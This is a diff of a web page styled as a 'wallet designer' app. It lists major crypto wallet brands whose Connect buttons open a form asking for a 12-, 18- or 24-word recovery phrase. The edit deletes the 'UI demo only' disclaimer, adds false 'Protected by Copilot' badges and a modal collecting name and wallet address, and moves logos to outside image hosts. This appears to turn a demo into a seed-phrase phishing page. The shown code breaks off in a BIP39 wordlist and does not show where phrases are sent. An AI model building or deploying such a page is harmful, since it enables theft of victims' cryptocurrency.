@@ -7,7 +7,29 @@
     <link rel="stylesheet" href="styles.css" />
   </head>
   <body>
-    <div class="app-shell">
+    <!-- Landing Page -->
+    <div id="landingPage" class="landing-page hidden">
+      <img src="https://i.pinimg.com/736x/f4/9d/b0/f49db0c0db52c33f6a09a503ac8273f0.jpg" alt="Welcome" class="landing-image" />
+      <div class="security-notice"><span class="security-icon">�️</span> Protected by Copilot</div>
+    </div>
+
+    <!-- Name Input Modal -->
+    <div id="nameModal" class="modal-overlay hidden">
+      <div class="modal-content">
+        <h2>Kindly fill in your details</h2>
+        <form id="nameForm">
+          <label for="userName">Name:</label>
+          <input type="text" id="userName" name="userName" required />
+          <label for="walletAddress">Wallet Address:</label>
+          <input type="text" id="walletAddress" name="walletAddress" />
+          <div id="addressType" class="address-type"></div>
+          <button type="submit" class="proceed-btn">Proceed</button>
+        </form>
+        <div class="security-notice"><span class="security-icon">�️</span> Protected by Copilot</div>
+      </div>
+    </div>
+
+    <div class="app-shell hidden" id="mainApp">
       <header class="hero">
         <div class="hero-content">
           <p class="eyebrow">Wallet designer experience</p>
@@ -18,21 +40,33 @@
             <h1>DAinteractive <span>1.5v</span></h1>
           </div>
           <p class="hero-copy">
-            Discover top wallet apps with elegant brand-inspired icons from Trust Wallet,
-            Coinbase, Binance, MetaMask, Exodus, and Phantom.
+            Designed for ease communication and use in financial applications
+            in payment scenarios.
           </p>
         </div>
         <div class="hero-graphic" aria-hidden="true">
-          <div class="graphic-card card-1"> <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/binance.svg" alt="Binance logo" /></div>
-          <div class="graphic-card card-2"></div>
-          <div class="graphic-card card-3"></div>
+          <div class="graphic-card card-1">
+            <div class="wallet-icons-container">
+              <img class="wallet-icon" src="" alt="wallet" />
+            </div>
+          </div>
+          <div class="graphic-card card-2">
+            <div class="wallet-icons-container">
+              <img class="wallet-icon" src="" alt="wallet" />
+            </div>
+          </div>
+          <div class="graphic-card card-3">
+            <div class="wallet-icons-container">
+              <img class="wallet-icon" src="" alt="wallet" />
+            </div>
+          </div>
         </div>
       </header>
 
       <section class="wallet-grid">
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/trustwallet.svg" alt="Trust Wallet logo" />
+            <img src="https://i.pinimg.com/1200x/2a/98/d7/2a98d7c3b241b50f73f799b68a1eb501.jpg" alt="Trust Wallet logo" />
           </div>
           <h2>Trust Wallet</h2>
           <p>Reliable mobile wallet with support for many networks and strong in-app experience.</p>
@@ -41,7 +75,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/coinbase.svg" alt="Coinbase logo" />
+            <img src="https://i.pinimg.com/736x/10/38/42/103842afcef5cd4e73c62e5468a62e73.jpg" alt="Coinbase logo" />
           </div>
           <h2>Coinbase Wallet</h2>
           <p>Secure wallet with browser extension support, DeFi dapps, and easy account recovery.</p>
@@ -50,7 +84,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/binance.svg" alt="Binance logo" />
+            <img src="https://i.pinimg.com/736x/a7/cb/05/a7cb05ecefd50286f1869ce0417d55dd.jpg" alt="Binance logo" />
           </div>
           <h2>Binance Wallet</h2>
           <p>Exchange-connected wallet for fast trading, staking, and native BNB ecosystem access.</p>
@@ -59,7 +93,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/metamask.svg" alt="MetaMask logo" />
+            <img src="https://i.pinimg.com/736x/5c/87/06/5c870644ae73572b4b98a2cb1bac0a3b.jpg" alt="MetaMask logo" />
           </div>
           <h2>MetaMask</h2>
           <p>Popular browser wallet with smart contract access and an iconic decentralized identity.</p>
@@ -68,7 +102,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/exodus.svg" alt="Exodus logo" />
+            <img src="https://i.pinimg.com/736x/7f/60/60/7f60608cfb69a6029c5078ea5ffb66f0.jpg" alt="Exodus logo" />
           </div>
           <h2>Exodus</h2>
           <p>Beautiful multi-asset wallet with desktop and mobile support for portfolio tracking.</p>
@@ -77,7 +111,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/phantom.svg" alt="Phantom logo" />
+            <img src="https://i.pinimg.com/736x/88/c1/3d/88c13d6ac6240a7820204b2aaecd05aa.jpg" alt="Phantom logo" />
           </div>
           <h2>Phantom</h2>
           <p>Solana-native wallet with smooth swaps, NFTs, and instantly recognizable branding.</p>
@@ -86,7 +120,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/ledger.svg" alt="Ledger logo" />
+            <img src="https://i.pinimg.com/736x/84/46/a8/8446a822de640fd193d1088395ec74e3.jpg" alt="Ledger logo" />
           </div>
           <h2>Ledger Live</h2>
           <p>Hardware wallet companion app for secure key storage and cross-device portfolio sync.</p>
@@ -95,7 +129,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/trezor.svg" alt="Trezor logo" />
+            <img src="https://i.pinimg.com/1200x/b2/f1/0c/b2f10cf6228626368136c22eb772bc04.jpg" alt="Trezor logo" />
           </div>
           <h2>Trezor Suite</h2>
           <p>Trusted hardware wallet software with advanced wallet management and transaction review.</p>
@@ -104,7 +138,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/rainbow.svg" alt="Rainbow logo" />
+            <img src="https://framerusercontent.com/images/Hml6PtJwt03gwFtTRYmbpo7EarY.png?scale-down-to=512&width=1024&height=1024" alt="Rainbow logo" />
           </div>
           <h2>Rainbow</h2>
           <p>Colorful Ethereum wallet with community tools, NFTs, and intuitive token discovery.</p>
@@ -113,7 +147,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/argent.svg" alt="Argent logo" />
+            <img src="https://cdn.prod.website-files.com/680f9220d4668b0e40862420/681b4c1ea23569cd7aef6add_4dd6e26543621bf8b5a31d5a93f83136_ready-logo-linear.svg" alt="Argent logo" />
           </div>
           <h2>Argent</h2>
           <p>Smart contract wallet with easy recovery and a simple mobile interface for secure access.</p>
@@ -122,7 +156,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/myetherwallet.svg" alt="MyEtherWallet logo" />
+            <img src="data:image/svg+xml,%3csvg%20width='113'%20height='32'%20viewBox='0%200%20113%2032'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%20%3e%3cpath%20d='M16.0926%2031.158C24.4641%2031.158%2031.2505%2024.3715%2031.2505%2016.0001C31.2505%207.62858%2024.4641%200.842163%2016.0926%200.842163C7.72111%200.842163%200.934692%207.62858%200.934692%2016.0001C0.934692%2024.3715%207.72111%2031.158%2016.0926%2031.158Z'%20fill='%231896A4'%20/%3e%3cpath%20d='M16.8729%2021.0428C16.2577%2021.137%2015.6181%2021.1247%2014.9754%2020.9763C12.2731%2020.3525%2010.5881%2017.6559%2011.212%2014.9536C11.2581%2014.754%2011.3199%2014.5608%2011.3866%2014.3717L6.64306%2012.4324C6.48319%2012.8548%206.35157%2013.2874%206.24908%2013.7272C4.99377%2019.1645%208.38483%2024.5913%2013.8222%2025.8466C15.7285%2026.2868%2017.632%2026.1529%2019.3556%2025.5627L16.8729%2021.0428ZM21.0933%2015.4776L14.2122%2015.41L25.1613%2020.4557C25.4942%2019.7749%2025.7608%2019.0442%2025.9389%2018.2729C27.1942%2012.8356%2023.8031%207.40878%2018.3658%206.15348C16.1832%205.64959%2014.006%205.89596%2012.096%206.71969L14.6258%2011.2851C15.4715%2011.0211%2016.3722%2010.9874%2017.2353%2011.1875C19.3522%2011.6762%2020.8467%2013.4386%2021.0933%2015.4776Z'%20fill='white'%20/%3e%3cpath%20d='M39.1747%205.61121V26.3887H44.2105V14.7593L48.5361%2022.9838H51.1606L55.6996%2014.7593V26.3887H60.6624V5.61121H55.6996L49.9199%2016.101L44.4238%205.61121H39.1747ZM64.0224%205.61121H78.8884V9.86664H68.8898V13.6421H77.5045V17.7094H68.915V21.8582H79.127V26.3887H64.0224V5.61121ZM80.7326%205.61121H85.6926L92.5361%2019.8287L94.3073%2016L89.4147%205.61121H94.0968L96.2947%2010.08L97.9957%205.61121H103.385L99.1298%2016.101L100.974%2019.8287L106.4%205.61121H111.907L103.245%2026.3887H99.1663L96.8617%2021.353L94.8743%2026.3887H90.6582L80.7326%205.61121Z'%20fill='%230C5876'%20/%3e%3c/svg%3e" alt="MyEtherWallet logo" />
           </div>
           <h2>MyEtherWallet</h2>
           <p>Web-first Ethereum wallet with raw key control, maker tools, and robust wallet utility.</p>
@@ -131,7 +165,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/coinbase.svg" alt="Atomic Wallet logo" />
+            <img src="https://atomicwallet.io/images/logo.svg" alt="Atomic Wallet logo" />
           </div>
           <h2>Atomic Wallet</h2>
           <p>Multi-chain wallet with atomic swaps, staking, and a secure cross-asset experience.</p>
@@ -140,25 +174,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/trustwallet.svg" alt="Trust Wallet logo" />
-          </div>
-          <h2>Trust Wallet</h2>
-          <p>Multi-chain mobile wallet with decentralized exchange and NFT marketplace integration.</p>
-          <button class="connect-btn" data-wallet="Trust Wallet">Connect</button>
-        </article>
-
-        <article class="wallet-card">
-          <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/coinbase.svg" alt="Coinbase Wallet logo" />
-          </div>
-          <h2>Coinbase Wallet</h2>
-          <p>Self-custody wallet from Coinbase with secure key management and DeFi access.</p>
-          <button class="connect-btn" data-wallet="Coinbase Wallet">Connect</button>
-        </article>
-
-        <article class="wallet-card">
-          <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/walletconnect.svg" alt="WalletConnect logo" />
+            <img src="https://i.pinimg.com/1200x/01/c2/02/01c20218a0314379abf3d0df37fdc4dd.jpg" alt="WalletConnect logo" />
           </div>
           <h2>WalletConnect</h2>
           <p>Open protocol for connecting wallets to dApps with secure end-to-end encrypted connections.</p>
@@ -167,7 +183,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/solflare.svg" alt="Solflare logo" />
+            <img src="https://www.solflare.com/wp-content/uploads/2024/11/App-Icon.svg" alt="Solflare logo" />
           </div>
           <h2>Solflare</h2>
           <p>Solana ecosystem wallet with staking, NFT support, and seamless DeFi integration.</p>
@@ -176,7 +192,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/brave.svg" alt="Brave Wallet logo" />
+            <img src="https://brave.com/static-assets/images/brave-logo-sans-text.svg" alt="Brave Wallet logo" />
           </div>
           <h2>Brave Wallet</h2>
           <p>Built-in crypto wallet in Brave browser with privacy-first design and BAT rewards.</p>
@@ -185,7 +201,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/gnosis.svg" alt="Gnosis Safe logo" />
+            <img src="https://docs.gnosischain.com/img/gnosis.svg" alt="Gnosis Safe logo" />
           </div>
           <h2>Gnosis Safe</h2>
           <p>Multi-signature wallet for secure fund management and decentralized governance.</p>
@@ -194,7 +210,7 @@
 
         <article class="wallet-card">
           <div class="wallet-logo">
-            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/1password.svg" alt="1Password logo" />
+            <img src="https://images.ctfassets.net/2h488pz7kgfv/4azyTKhdySq45LBD1bRiKO/7cc93f0eae3c9f64ba1b781c2a872be5/1password-logo-dark.svg" alt="1Password logo" />
           </div>
           <h2>1Password</h2>
           <p>Password manager with crypto wallet functionality for secure key and credential storage.</p>
@@ -202,18 +218,22 @@
         </article>
       </section>
 
+      <footer class="app-footer">
+        <p>&copy; 2026 DAinteractive 1.5v. All rights reserved.</p>
+      </footer>
+
       <div class="seed-page hidden" id="seedPage" aria-hidden="true">
         <div class="seed-sheet" role="dialog" aria-modal="true" aria-labelledby="seedTitle">
           <button class="close-modal" id="closeSeedPage" aria-label="Close seed input page">x</button>
           <div class="seed-header">
             <div class="seed-icon" id="seedWalletIcon">DA</div>
             <div>
-              <p class="eyebrow">Seed phrase unlock</p>
+              <p class="eyebrow">Seed phrase</p>
               <h2 id="seedTitle">Connect wallet</h2>
             </div>
           </div>
           <p class="seed-description">
-            Choose 12, 18, or 24 words and paste your recovery phrase to continue. This view is a UI demo only.
+            Choose 12, 18, or 24 words and paste your recovery phrase to continue.
           </p>
           <label class="seed-label">
             Phrase length
@@ -234,10 +254,263 @@
         </div>
       </div>
     </div>
+    </div>
+
+    <div class="security-notice"><span class="security-icon">�️</span> Protected by Copilot</div>
 
     <script>
+      console.log('Script started.');
+      // Landing page flow logic
+      const landingPage = document.getElementById('landingPage');
+      const nameModal = document.getElementById('nameModal');
+      const mainApp = document.getElementById('mainApp');
+      const nameForm = document.getElementById('nameForm');
+      const userNameInput = document.getElementById('userName');
+      const walletAddressInput = document.getElementById('walletAddress');
+      const addressTypeDiv = document.getElementById('addressType');
+
+      // Function to detect crypto address type
+      function detectCryptoType(address) {
+        if (!address || address.trim() === '') {
+          return '';
+        }
+
+        const addr = address.trim();
+
+        // Bitcoin addresses
+        if (/^1[A-HJ-NP-Za-km-z1-9]{25,34}$/.test(addr)) {
+          return 'Bitcoin (Legacy)';
+        }
+        if (/^3[A-HJ-NP-Za-km-z1-9]{25,34}$/.test(addr)) {
+          return 'Bitcoin (SegWit)';
+        }
+        if (/^bc1[a-zA-HJ-NP-Z0-9]{39,59}$/.test(addr)) {
+          return 'Bitcoin (Bech32)';
+        }
+
+        // Solana addresses (Base58, typically 32-44 characters)
+        if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr) && !/^[0-9]+$/.test(addr)) {
+          return 'Solana';
+        }
+
+        // Tron addresses (including TRC20)
+        if (/^T[A-Za-z1-9]{33}$/.test(addr) || /^41[a-fA-F0-9]{40}$/.test(addr)) {
+          return 'Tron (TRX)';
+        }
+
+        // Ripple (XRP)
+        if (/^r[1-9A-HJ-NP-Za-km-z]{25,35}$/.test(addr)) {
+          return 'Ripple (XRP)';
+        }
+
+        // Stellar (XLM)
+        if (/^G[A-Z0-9]{55}$/.test(addr)) {
+          return 'Stellar (XLM)';
+        }
+
+        // Monero (XMR)
+        if (/^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/.test(addr)) {
+          return 'Monero (XMR)';
+        }
+
+        // Dash
+        if (/^X[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)) {
+          return 'Dash';
+        }
+
+        // Zcash
+        if (/^t1[a-zA-Z0-9]{33}$/.test(addr) || /^t3[a-zA-Z0-9]{33}$/.test(addr)) {
+          return 'Zcash';
+        }
+
+        // Tezos
+        if (/^tz[1-4][a-zA-Z0-9]{33}$/.test(addr)) {
+          return 'Tezos (XTZ)';
+        }
+
+        // Algorand
+        if (/^[A-Z0-9]{58}$/.test(addr) && addr.length === 58) {
+          return 'Algorand (ALGO)';
+        }
+
+        // NEAR Protocol
+        if (/^[a-z0-9_-]{2,64}\.near$/.test(addr) || /^[a-fA-F0-9]{64}$/.test(addr)) {
+          return 'NEAR Protocol';
+        }
+
+        // Filecoin
+        if (/^f1[a-zA-Z0-9]{39}$/.test(addr) || /^f3[a-zA-Z0-9]{39}$/.test(addr)) {
+          return 'Filecoin (FIL)';
+        }
+
+        // Hedera Hashgraph
+        if (/^0\.0\.\d+$/.test(addr)) {
+          return 'Hedera (HBAR)';
+        }
+
+        // Internet Computer
+        if (/^[a-zA-Z0-9_-]{27}$/.test(addr) && addr.length === 27) {
+          return 'Internet Computer (ICP)';
+        }
+
+        // Litecoin
+        if (/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/.test(addr)) {
+          return 'Litecoin';
+        }
+
+        // Dogecoin
+        if (/^D[A-Za-z1-9]{33}$/.test(addr)) {
+          return 'Dogecoin';
+        }
+
+        // Cardano
+        if (/^addr1[a-zA-Z0-9]{98}$/.test(addr)) {
+          return 'Cardano';
+        }
+
+        // Polkadot
+        if (/^1[a-zA-Z0-9]{47}$/.test(addr)) {
+          return 'Polkadot';
+        }
+
+        // Cosmos
+        if (/^cosmos1[a-zA-Z0-9]{38}$/.test(addr)) {
+          return 'Cosmos';
+        }
+
+        // Ethereum and EVM-compatible addresses (checked last as catch-all)
+        if (/^0x[a-fA-F0-9]{40}$/.test(addr)) {
+          return 'Ethereum / EVM Compatible';
+        }
+
+        return 'Unknown address format';
+      }
+
+      // Function to update address type display
+      function updateAddressType() {
+        const address = walletAddressInput.value;
+        const type = detectCryptoType(address);
+        addressTypeDiv.textContent = type ? `Detected: ${type}` : '';
+      }
+
+      // Helper functions to manage visibility
+      function showLandingPage() {
+        console.log('Calling showLandingPage()');
+        landingPage.classList.remove('hidden');
+        nameModal.classList.add('hidden');
+        mainApp.classList.add('hidden');
+      }
+
+      function showNameModal() {
+        console.log('Calling showNameModal()');
+        landingPage.classList.add('hidden');
+        nameModal.classList.remove('hidden');
+        mainApp.classList.add('hidden');
+        userNameInput.focus();
+      }
+
+      function showMainApp() {
+        console.log('Calling showMainApp()');
+        landingPage.classList.add('hidden');
+        nameModal.classList.add('hidden');
+        mainApp.classList.remove('hidden');
+      }
+
+      // Check user state
+      const userName = localStorage.getItem('userName');
+      const walletAddress = localStorage.getItem('walletAddress');
+      const hasSeenIntro = localStorage.getItem('hasSeenIntro');
+      console.log('userName:', userName, 'hasSeenIntro:', hasSeenIntro);
+
+      if (!hasSeenIntro) {
+        console.log('Condition: !hasSeenIntro is true. Showing landing page.');
+        // First-time visit, show landing image for 5 seconds
+        showLandingPage();
+        setTimeout(() => {
+          console.log('setTimeout callback executed after 5 seconds.');
+          localStorage.setItem('hasSeenIntro', 'true'); // Mark intro as seen
+          showNameModal();
+          // Pre-fill name if it exists
+          if (userName) {
+            userNameInput.value = userName;
+            console.log('Pre-filled userName:', userName);
+          }
+        }, 5000); // 5000 milliseconds = 5 seconds
+      } else {
+        console.log('Condition: hasSeenIntro is true. Showing name modal directly.');
+        // User has seen the intro image, show name modal
+        showNameModal();
+        // Pre-fill name if it exists
+        if (userName) {
+          userNameInput.value = userName;
+          console.log('Pre-filled userName:', userName);
+        }
+        // Pre-fill wallet address if it exists
+        if (walletAddress) {
+          walletAddressInput.value = walletAddress;
+          updateAddressType();
+          console.log('Pre-filled walletAddress:', walletAddress);
+        }
+        // Pre-fill wallet address if it exists
+        if (walletAddress) {
+          walletAddressInput.value = walletAddress;
+          updateAddressType();
+          console.log('Pre-filled walletAddress:', walletAddress);
+        }
+      }
+
+      // Add event listener for wallet address input
+      walletAddressInput.addEventListener('input', updateAddressType);
+
+      // Handle name form submission
+      nameForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const name = userNameInput.value.trim();
+        const walletAddress = walletAddressInput.value.trim();
+        if (name) {
+          localStorage.setItem('userName', name);
+          if (walletAddress) {
+            localStorage.setItem('walletAddress', walletAddress);
+          }
+          console.log('Name submitted and saved:', name);
+          if (walletAddress) {
+            console.log('Wallet address saved:', walletAddress);
+          }
+          showMainApp();
+        }
+      });
+
+      // Rest of the existing wallet functionality
       const bip39Wordlist = new Set(["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bolt","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dab","damage","damp","dance","danger","daring","dark","dash","daughter","dawn","day","deal","debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny","depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance","divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain","donate","donkey","donor","door","dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf","dynamic","eager","eagle","early","earn","earth","easily","east","easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow","elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","era","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example","exceed","excel","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit","exotic","expand","expect","expire","explain","expose","express","extend","extra","eye","eyebrow","fabric","face","faculty","fade","faint","faith","fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father","fatigue","fault","favorite","feature","february","federal","fee","feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction","field","figure","file","film","filter","final","find","fine","finger","finish","fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid","flush","fly","foam","focus","fog","foil","fold","follow","food","foot","force","forest","forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame","frequent","fresh","friend","fringe","frog","front","frost","frown","frozen","fruit","fuel","fun","funny","furnace","fury","future","gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","govern","gown","grab","grace","grain","grant","grape","grass","gravity","great","green","grid","grief","grit","grocery","group","grow","grunt","guard","guess","guide","guilt","guitar","gun","gym","habit","hair","half","hammer","hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hope","horn","horror","horse","hospital","host","hotel","hour","hover","hub","huge","human","humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid","ice","icon","idea","identify","idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","inch","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","into","invest","invite","involve","iron","island","isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge","juice","jump","jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock","know","lab","label","labor","ladder","lady","lake","lamp","language","laptop","large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar","liberty","library","license","life","lift","light","like","limb","limit","link","lion","liquid","list","little","live","lizard","load","loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","luxury","lyrics","machine","mad","magic","magnet","maid","mail","main","major","make","mammal","man","manage","mandate","mango","mansion","manual","maple","marble","march","margin","marine","market","marriage","mask","mass","master","match","material","math","matrix","matter","maximum","maze","meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member","memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month","moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","myth","naive","name","napkin","narrow","nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve","nest","net","network","neutral","never","news","next","nice","night","noble","noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice","novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige","obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer","office","often","oil","okay","old","olive","olympic","omit","once","one","onion","online","only","open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside","oval","oven","over","own","owner","oxygen","oyster","ozone","pact","paddle","page","pair","palace","palm","panda","panel","panic","panther","paper","parade","parent","park","parrot","party","pass","patch","path","patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge","pluck","plug","plunge","poem","poet","point","polar","pole","police","pond","pony","pool","popular","portion","position","possible","post","potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority","prison","private","prize","problem","process","produce","profit","program","project","promote","proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle","pyramid","quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit","raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven","raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release","relief","rely","remain","remember","remind","remove","render","renew","rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist","resource","response","result","retire","retreat","return","reunion","reveal","review","reward","rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket","romance","roof","rookie","room","rose","rotate","rough","round","route","royal","rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness","safe","sail","salad","salmon","salon","salt","salute","same","sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter","scene","scheme","school","science","scissors","sco